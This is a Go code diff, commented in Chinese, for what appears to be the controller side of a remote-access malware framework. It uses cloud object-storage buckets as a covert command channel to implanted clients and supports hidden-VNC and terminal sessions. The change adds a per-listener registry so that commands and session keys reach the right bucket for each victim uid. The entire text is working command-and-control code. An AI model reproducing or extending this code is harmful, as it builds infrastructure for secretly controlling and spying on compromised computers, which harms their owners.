@@ -14,6 +14,7 @@ import (
 	"sort"
 	"strconv"
 	"strings"
+	"sync"
 	"time"
 )
 
@@ -21,7 +22,52 @@ import (
 var BroadcastToXTermSessions func(uid string, data []byte)
 var BroadcastToHVNCSessions func(uid, sid string, frame []byte)
 
-func HandleOSSConnection(endpoint, accessKeyID, accessKeySecret, bucketName string) {
+// clientByUID 记录每个 OSS 客户端由哪个监听器的 client 服务（stopKey 即该监听器的
+// listen_address）。sendcommand 只有 uid，多监听器下必须靠它取回正确的 client，
+// 否则命令会被写进另一个桶（原实现用包级 Service，多监听器时恒为最后初始化的那个）。
+type registeredClient struct {
+	client  *Client
+	stopKey string
+}
+
+var (
+	clientRegMu sync.RWMutex
+	clientByUID = make(map[string]registeredClient)
+)
+
+// RegisterClient 登记某客户端归属的 OSS 监听器（客户端每次消息都会刷新）
+func RegisterClient(uid, stopKey string, c *Client) {
+	if uid == "" || c == nil {
+		return
+	}
+	clientRegMu.Lock()
+	clientByUID[uid] = registeredClient{client: c, stopKey: stopKey}
+	clientRegMu.Unlock()
+}
+
+// ClientForUID 取服务该客户端的 OSS client；未登记（监听器已停止/客户端从未上报）返回 nil
+func ClientForUID(uid string) *Client {
+	clientRegMu.RLock()
+	defer clientRegMu.RUnlock()
+	return clientByUID[uid].client
+}
+
+// UnregisterListener 监听器停止时清掉它名下的客户端登记，
+// 避免 sendcommand 继续往已停监听器的桶里写命令
+func UnregisterListener(stopKey string) {
+	clientRegMu.Lock()
+	for uid, rc := range clientByUID {
+		if rc.stopKey == stopKey {
+			delete(clientByUID, uid)
+		}
+	}
+	clientRegMu.Unlock()
+}
+
+// HandleOSSConnection 轮询指定 OSS 桶。client 由调用方（handleOpenPort）初始化后传入：
+// 每个监听器一份，不再共用全局状态。stopKey 即该监听器的 listen_address，
+// 用于读取停止通道与登记客户端归属（原实现由四段地址拼回，属脆弱重建）。
+func HandleOSSConnection(client *Client, stopKey string) {
 	// 崩溃防护：OSS 处理循环任何 panic 都不能杀死整个进程
 	defer func() {
 		if r := recover(); r != nil {
@@ -29,10 +75,7 @@ func HandleOSSConnection(endpoint, accessKeyID, accessKeySecret, bucketName stri
 		}
 	}()
 
-	InitClient(endpoint, accessKeyID, accessKeySecret, bucketName)
-
 	// 锁内读取停止通道并缓存，避免 select 内无锁读 map 与关闭路径 delete 并发（map 竞争 panic）
-	stopKey := endpoint + ":" + accessKeyID + ":" + accessKeySecret + ":" + bucketName
 	connection.MuClientListenerType.Lock()
 	stopCh, _ := connection.StopChan[stopKey]
 	connection.MuClientListenerType.Unlock()
@@ -51,7 +94,7 @@ func HandleOSSConnection(endpoint, accessKeyID, accessKeySecret, bucketName stri
 		}
 		time.Sleep(pollInterval)
 		var keys []string
-		for _, c2 := range List(Service) {
+		for _, c2 := range List(client) {
 			if strings.Contains(c2.Key, "client") {
 				keys = append(keys, c2.Key)
 			}
@@ -64,7 +107,7 @@ func HandleOSSConnection(endpoint, accessKeyID, accessKeySecret, bucketName stri
 
 		// 3. 顺序处理
 		for _, key := range keys {
-			process_server(key) // 不用 `go`，保证按顺序执行
+			process_server(client, stopKey, key) // 不用 `go`，保证按顺序执行
 		}
 
 		// 空闲退避: 无消息时间隔翻倍直至上限;有消息立即回到 1s
@@ -77,19 +120,11 @@ func HandleOSSConnection(endpoint, accessKeyID, accessKeySecret, bucketName stri
 			pollInterval = 1 * time.Second
 		}
 	}
-	//for {
-	//	time.Sleep(1 * time.Second)
-	//	for _, c2 := range List(Service) {
-	//		if strings.Contains(c2.Key, "client") {
-	//			go process_server(c2.Key)
-	//		}
-	//	}
-	//}
 }
-func process_server(name string) {
+func process_server(c *Client, stopKey, name string) {
 
-	message := Get(Service, name)
-	Del(Service, name)
+	message := Get(c, name)
+	Del(c, name)
 	// 长度校验：至少 4 字节类型头
 	if len(message) < 4 {
 		logx.Warnf("⚠️ [OSS] 消息长度不足: %d (key=%s)\n", len(message), name)
@@ -127,6 +162,8 @@ func process_server(name string) {
 			return
 		}
 		uid := encrypt.BytesToMD5(metainfo)
+		// 登记归属：sendcommand 只有 uid，靠它取回本监听器的 client
+		RegisterClient(uid, stopKey, c)
 
 		// 立即为客户端生成会话密钥（确保与客户端同步）
 		if encrypt.GlobalKeyManager != nil {
@@ -219,7 +256,7 @@ func process_server(name string) {
 				if err != nil {
 					logx.Warnf("⚠️ [OSS-FIRSTBLOOD] 客户端 %s 会话密钥唯一化失败: %v\n", uid, err)
 				} else if b64Payload := command.BuildSessionNonceMsgWithKey(initialKey, nonce); b64Payload != nil {
-					Send(Service, uid+fmt.Sprintf("/server_%020d", time.Now().UnixNano()), b64Payload)
+					Send(c, uid+fmt.Sprintf("/server_%020d", time.Now().UnixNano()), b64Payload)
 					logx.Infof("🔑 [OSS-FIRSTBLOOD] 客户端 %s 会话密钥唯一化完成，nonce 已写入命令对象\n", uid)
 				}
 			}
@@ -262,6 +299,7 @@ func process_server(name string) {
 			logx.Println(err)
 		}
 		uid := encrypt.BytesToMD5(metainfo)
+		RegisterClient(uid, stopKey, c)
 
 		// 统一离线检测器 Touch
 		if connection.GlobalOfflineDetector != nil {
